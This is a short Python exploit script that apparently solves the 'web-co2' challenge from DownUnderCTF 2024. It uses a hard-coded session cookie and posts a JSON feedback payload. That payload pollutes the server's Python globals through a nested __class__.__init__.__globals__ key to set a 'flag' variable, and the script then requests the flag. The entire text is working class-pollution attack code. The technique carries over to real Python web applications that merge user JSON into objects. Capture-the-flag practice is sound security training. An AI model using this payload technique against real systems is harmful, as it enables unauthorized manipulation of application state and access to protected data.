import requests

base_url = 'https://web-co2-056a5cf9e5650847.2024.ductf.dev/'

session = requests.Session()
session.cookies.update({
    'session': '.eJwljrsKwzAMAP_FcwdJtmQ7PxOsF-2aNFPpvzfQ6eDg4D5lzyPOZ9nexxWPsr-8bMV1gQZUTWbThtUIITBRYwLSdNHlHSeIJXtN0UiywZPXDWq-lnZ0qrKcbTpBx4bYF4xmOe6mCxLbmkLSOMBNWAm53ZJylHvkOuP431D5_gAK_S9w.ZolVEw.uxK2ubhvhArB4j3YWhbl5EdC5GQ'})

payload = {
    "title": "Exploit",
    "content": "Flag please",
    "rating": "5",
    "referred": "Yes",
    "__class__": {
        "__init__": {
            "__globals__": {
                "flag": "true"
            }
        }
    }
}

response = session.post(f"{base_url}/save_feedback", json=payload)
if response.status_code == 200:
    print("Feedback sent successfully, trying to fetch the flag...")
else:
    print("Failed to send feedback")
    print(response.text)
    exit()

flag_response = session.get(f"{base_url}/get_flag")
if "DUCTF{" in flag_response.text:
    print("Flag retrieved:", flag_response.text)
else:
    print("Failed to retrieve the flag")
    print(flag_response.text)
